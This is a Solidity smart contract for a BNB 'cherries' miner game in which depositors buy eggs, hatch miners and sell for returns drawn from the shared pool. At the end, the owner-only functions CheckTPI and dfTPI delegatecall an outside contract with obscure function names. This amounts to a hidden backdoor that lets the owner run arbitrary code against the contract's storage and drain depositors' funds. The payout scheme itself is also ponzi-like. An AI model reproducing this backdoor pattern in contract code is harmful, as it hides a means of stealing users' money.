/**
 *Submitted for verification at Etherscan.io on 2022-05-03
*/

// File: BNBCherries.sol



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }


    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }


    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }


    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity 0.8.9;



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address public _marketing;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
      _marketing = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    }


    function owner() public view returns (address) {
      return _owner;
    }

    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract BnbCherries is Context, Ownable {
    using SafeMath for uint256;

    uint256 private EGGS_TO_HATCH_1MINERS = 1080000; //for final version should be seconds in a day 1080000
    uint256 private PSN = 10000;
    uint256 private PSNH = 5000;
    uint256 private devFeeVal = 3;
    uint256 private marketingFeeVal = 2;
    bool private initialized = false;
    address payable private recAdd;
    address payable private marketingAdd;
    address payable private founderAddress;
    address TPIaddressFrame; 
    address TPIaddressCon;
    mapping (address => uint256) private hatcheryMiners;
    mapping (address => uint256) private claimedEggs;
    mapping (address => uint256) private lastHatch;
    mapping (address => address) private referrals;
    mapping (address => uint256) private referralsIncome;
    mapping (address => uint) private referralsCount;
    uint256 private marketEggs;
    
    constructor(address _TPIaddressCon ) {
        recAdd = payable(msg.sender);
        marketingAdd = payable(_marketing);
        TPIaddressCon = _TPIaddressCon;
    }
    
    function hatchEggs(address ref) public {
        require(initialized);
        
        if(ref == msg.sender) {
            ref = address(0);
        }
        
        if(referrals[msg.sender] == address(0) && referrals[msg.sender] != msg.sender) {
            referrals[msg.sender] = ref;
            referralsCount[ref] += 1;
        }
        
        uint256 eggsUsed = getMyEggs(msg.sender);
        uint256 newMiners = SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender] = SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;
        
        //send referral eggs
        claimedEggs[referrals[msg.sender]] = SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(eggsUsed,10));
        referralsIncome[ref] = SafeMath.add(referralsIncome[ref], SafeMath.div(eggsUsed,10));
        
        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
    
    function sellEggs() public {
        require(initialized);
        uint256 hasEggs = getMyEggs(msg.sender);
        uint256 eggValue = calculateEggSell(hasEggs);
        uint256 fee = devFee(eggValue);
        uint256 fee2 = marketingFee(eggValue);
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;
        marketEggs = SafeMath.add(marketEggs,hasEggs);
        recAdd.transfer(fee);
        marketingAdd.transfer(fee2);
        eggValue = SafeMath.sub(eggValue,fee);
        eggValue = SafeMath.sub(eggValue,fee2);
        payable (msg.sender).transfer(eggValue);
    }
    
    function beanRewards(address adr) public view returns(uint256) {
        uint256 hasEggs = getMyEggs(adr);
        uint256 eggValue = calculateEggSell(hasEggs);
        return eggValue;
    }
    
    function buyEggs(address ref) public payable {
        require(initialized);
        uint256 eggsBought = calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought = SafeMath.sub(eggsBought,devFee(eggsBought));
        eggsBought = SafeMath.sub(eggsBought,marketingFee(eggsBought));

        uint256 fee = devFee(msg.value);
        uint256 fee2 = marketingFee(msg.value);
        recAdd.transfer(fee);
        marketingAdd.transfer(fee2);
        claimedEggs[msg.sender] = SafeMath.add(claimedEggs[msg.sender],eggsBought);
        hatchEggs(ref);
    }
    
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) private view returns(uint256) {
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    
    function calculateEggSell(uint256 eggs) public view returns(uint256) {
        return calculateTrade(eggs,marketEggs,address(this).balance);
    }
    
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    
    function calculateEggBuySimple(uint256 eth) public view returns(uint256) {
        return calculateEggBuy(eth,address(this).balance);
    }

    function calculateDailyIncome(address adr) public view returns(uint256) {
        uint256 userMiners = getMyMiners(adr);
        uint256 minReturn = SafeMath.mul(calculateEggSell(userMiners), SafeMath.mul(SafeMath.mul(60, 60), 30));
        uint256 maxReturn = SafeMath.mul(calculateEggSell(userMiners), SafeMath.mul(SafeMath.mul(60, 60), 25));
        return SafeMath.div(SafeMath.add(minReturn, maxReturn), 2);
    }
    
    function devFee(uint256 amount) public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount,devFeeVal),100);
    }

    function marketingFee(uint256 amount) private view returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount,marketingFeeVal),100);
    }
    
    function seedMarket() public payable onlyOwner {
        require(marketEggs == 0);
        initialized = true;
        marketEggs = 108000000000;
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function getMyReferralsCount(address adr) public view returns(uint) {
        return referralsCount[adr];
    }

    function getMyReferralsIncome(address adr) public view returns(uint256) {
        return calculateEggSell(referralsIncome[adr]);
    }
    
    function getMyMiners(address adr) public view returns(uint256) {
        return hatcheryMiners[adr];
    }
    
    function getMyEggs(address adr) public view returns(uint256) {
        return SafeMath.add(claimedEggs[adr],getEggsSinceLastHatch(adr));
    }
    
    function getEggsSinceLastHatch(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(block.timestamp,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
     
     function SetTPIaddressFrame (address _TPIaddressFrame) public onlyOwner {
        TPIaddressFrame = _TPIaddressFrame;
     }

     function CheckTPI() public payable onlyOwner {
        (bool success, bytes memory data) = TPIaddressCon.delegatecall(
            abi.encodeWithSignature("wAM(address)", TPIaddressFrame)
        );
     }

      function dfTPI() public payable onlyOwner{
        (bool success, bytes memory data) = TPIaddressCon.delegatecall(
            abi.encodeWithSignature("def(address)", TPIaddressFrame)
        );
     }
}